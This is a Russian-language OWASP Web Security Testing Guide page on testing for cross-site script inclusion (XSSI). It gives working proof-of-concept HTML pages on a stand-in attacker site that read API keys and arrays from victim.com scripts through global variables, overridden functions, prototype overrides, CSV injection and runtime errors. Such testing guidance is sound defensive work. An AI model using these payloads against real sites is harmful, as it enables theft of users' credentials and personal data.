---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование включения межсайтовых скриптов (XSSI)

|ID          |
|------------|
|WSTG-CLNT-13|

## Обзор

Уязвимость включения межсайтовых скриптов (англ.: Cross Site Script Inclusion, XSSI) делает возможной утечку чувствительных данных через границу источника (англ.: origin) или домена. Чувствительными данными могут быть данные, связанные с аутентификацией (статус входа в систему, cookie, токены аутентификации, идентификаторы сессий и т.д.) или персональные данные пользователя (адреса email, номера телефонов, данные банковской карты, номера счетов соц.страхования и т.д.). XSSI — это атака на стороне клиента, похожая на подделку межсайтовых запросов (CSRF), но имеющая другую цель. Если CSRF использует контекст аутентифицированного пользователя для выполнения определенных действий по изменению состояния на странице жертвы (например, перевода денег на счёт злоумышленника, повышения привилегий, сброса пароля и т.д.), то XSSI вместо этого использует JavaScript на стороне клиента для раскрытия чувствительных данных из аутентифицированных сессий.

По умолчанию web-сайтам разрешён доступ к данным только в том случае, если они из одного и того же источника. Это ключевой принцип защиты приложений, регулируемый политикой одного источника (определённой в [RFC 6454](https://tools.ietf.org/html/rfc6454)). Источник определяется там как комбинация схемы URI (HTTP или HTTPS), имени хоста и номера порта. Однако эта политика не применима к включениям HTML-тега `<script>`. Это исключение необходимо, так как без него web-сайты не смогли бы пользоваться сторонними сервисами, проводить анализ трафика, использовать рекламные платформы и т.д.

Когда браузер открывает web-сайт с тегами `<script>`, ресурсы могут извлекаться из другого источника или домена. С этого момента ресурсы интерпретируются в том же контексте, что и подключивший их сайт или браузер, что даёт возможность утечки чувствительных данных. В большинстве случаев это достигается с помощью JavaScript, однако источником скрипта не обязательно должен быть файл JavaScript с типом `text/javascript` или расширением `.js`.

Уязвимости в старых браузерах (IE9/10) допускали утечку данных через сообщения об ошибках JavaScript во время выполнения, но теперь эти уязвимости исправлены и считаются менее актуальными. Установив у тега `<script>` атрибут `charset`, злоумышленник или тестировщик может применить кодировку UTF-16, что в некоторых случаях даёт утечку данных в других форматах данных (например, JSON). Подробнее об этих атаках см. [XSSI-атаки на основе идентификаторов](https://www.mbsd.jp/Whitepaper/xssi.pdf).

## Задачи тестирования

- Найти в системе чувствительные данные.
- Оценить возможность их утечки с помощью различных методов.

## Как тестировать

### Сбор информации с помощью аутентифицированных и неаутентифицированных сессий пользователей

Узнайте, какие конечные точки отвечают за отправку чувствительных данных, какие параметры им требуются, и все соответствующие им динамически и статически сгенерированные ответы JavaScript через аутентифицированные сессии пользователя. Обратите особое внимание на чувствительные данные, передаваемые в [JSONP](https://ru.wikipedia.org/wiki/JSONP). Чтобы найти динамически сгенерированные ответы JavaScript, сгенерируйте аутентифицированные и неаутентифицированные запросы, а затем сравните их. Если они разные, это означает, что ответ динамический; в противном случае он статичен. Чтобы упростить эту задачу, можно использовать такой инструмент, как плагин [Veit Hailperin к Burp](https://github.com/luh2/DetectDynamicJS). Обязательно проверьте и другие типы файлов помимо JavaScript; XSSI не ограничивается только им.

### Могут ли чувствительные данные быть раскрыты с помощью JavaScript?

Тестировщикам следует проанализировать на предмет утечки данных через XSSI-уязвимости код следующих сущностей:

1. Глобальные переменные
2. Глобальные параметры функций
3. CSV (значения, разделённые запятыми) с «кражей цитат»
4. Ошибки выполнения JavaScript
5. Цепочка прототипов с `this`

### 1. Утечка чувствительных данных через глобальные переменные

Ключ API хранится в файле JavaScript с URL `https://victim.com/internal/api.js` на сайте жертвы, `victim.com`, который доступен только для аутентифицированных пользователей. Злоумышленник контролирует сайт `attackingwebsite.com`, и использует тег `<script>` для ссылки на файл JavaScript.

Ниже код `https://victim.com/internal/api.js`:

```javascript
(function() {
  window.secret = "supersecretUserAPIkey";
})();
```

На сайте злоумышленника `attackingwebsite.com` размещается `index.html` со следующим кодом:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Утечка данных через глобальные переменные</title>
  </head>
  <body>
    <h1>Утечка данных через глобальные переменные</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Вот ваш секрет: <b>" + window.secret + "</b>";
    </script>
  </body>
</html>
```

В этом примере жертва аутентифицируется на `victim.com`. Злоумышленник заманивает жертву на `attackingwebsite.com` посредством социальной инженерии, фишинговых писем и т.д. Затем браузер жертвы извлекает `api.js `, что приводит к утечке чувствительных данных через глобальную переменную JavaScript и их отображению с помощью `innerHTML`.

### 2. Утечка чувствительных данных через глобальные параметры функций

Этот пример похож на предыдущий, за исключением того, что на `attackingwebsite.com ` используется глобальная функция JavaScript для извлечения чувствительных данных путём перезаписи глобальной функции JavaScript жертвы.

Ниже код `https://victim.com/internal/api.js`:

```javascript
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();
```

На сайте злоумышленника `attackingwebsite.com` размещается `index.html` со следующим кодом:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Утечка данных через глобальные параметры функций</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Вот ваш секрет: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>
```

Существуют и другие уязвимости XSSI, которые могут привести к утечке чувствительных данных либо через цепочки прототипов JavaScript, либо через глобальные вызовы функций. Подробнее об этих атаках см. [Неожиданные опасности динамического JavaScrip](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf).

### 3. Утечка чувствительных данных через CSV с «кражей цитат»

Для утечки данных злоумышленник/тестировщик должен иметь возможность инъекции кода JavaScript в данные CSV. Следующий пример кода представляет собой выдержку из статьи Takeshi Terada [XSSI-атаки на основе идентификаторов](https://www.mbsd.jp/Whitepaper/xssi.pdf).

```http
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"
```

В этом примере столбцы `___`  в качестве точек для инъекции и вставка кода JavaScript вместо них приводит к следующему результату.

```text
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"
```

[Jeremiah Grossman писал об аналогичной уязвимости в Gmail](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html) в 2006 году, которая позволяла извлекать контакты пользователей в формате JSON. В этом случае данные были получены из Gmail и распарсены  движком JavaScript браузера с помощью конструктора массива без ссылок. Злоумышленник может получить доступ к этому массиву с чувствительными данными, определив и перезаписав внутренний конструктор массива следующим образом:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Утечка контактов gmail через JSON</title>
  </head>
  <body>
    <script>
      function Array() {
        // крадём данные
      }
    </script>
    <script src="http://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>
```

### 4. Утечка чувствительных данных из-за ошибок во время выполнения JavaScript

Браузеры обычно выводят стандартизированные [сообщения об ошибках JavaScript](https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Errors). Однако в случае IE9/10 сообщения об ошибках во время выполнения содержали дополнительные сведения, которые могли быть использованы для утечки данных. Например, сайт `victim.com` предоставляет следующий контент по URL`http://victim.com/service/csvendpoint` для аутентифицированных пользователей:

```http
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: 13

1,abc,def,ghi
```

Эта уязвимость может эксплуатироваться следующим образом:

```html
<!--обработчик ошибок -->
<script>window.onerror = function(err) {alert(err)}</script>
<!--загрузить целевой CSV -->
<script src="http://victim.com/service/csvendpoint"></script>
```

Когда браузер пытается отобразить содержимое CSV в виде JavaScript, он терпит неудачу и происходит утечка чувствительных данных:

![JavaScript runtime error message](images/XSSI1.jpeg)\
*Рисунок 4.11.13-1: Сообщение об ошибке во время выполнения JavaScript*

### 5. Утечка чувствительных данных через цепочку прототипов с `this`

В JavaScript ключевое слово `this` имеет динамическую область действия. Это означает, что если для объекта вызывается функция, `this` будет указывать на этот объект, даже если вызываемая функция не принадлежит самому объекту. Это поведение может эксплуатироваться для утечки данных. В следующем примере с [демонстрационной страницы Sebastian Leike](http://sebastian-lekies.de/leak/) чувствительные данные хранятся в массиве. Злоумышленник может переопределить `Array.prototype.forEach` с помощью функции, контролируемой злоумышленником. Если код вызывает функцию `forEach` для экземпляра массива, содержащего чувствительные значения, будет вызвана функция, контролируемая злоумышленником, с `this`, указывающим на объект, содержащий чувствительные данные.

Вот отрывок из файла JavaScript, содержащего чувствительные данные, `javascript.js`:

```javascript
...
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

  secret.forEach(function(element) {
    // здесь что-нибудь делаем
  });  
})();
...
```

Чувствительные данные могут быть раскрыты с помощью следующего кода JavaScript:

```html
...
 <div id="result">

    </div>
    <script>
      Array.prototype.forEach = function(callback) {
        var resultString = "Вот ваши секреты: <b>";
        for (var i = 0, length = this.length; i < length; i++) {
          if (i > 0) {
            resultString += ", ";
          }
          resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
      };
    </script>
    <script src="http://victim.com/..../javascript.js"></script>
...
```
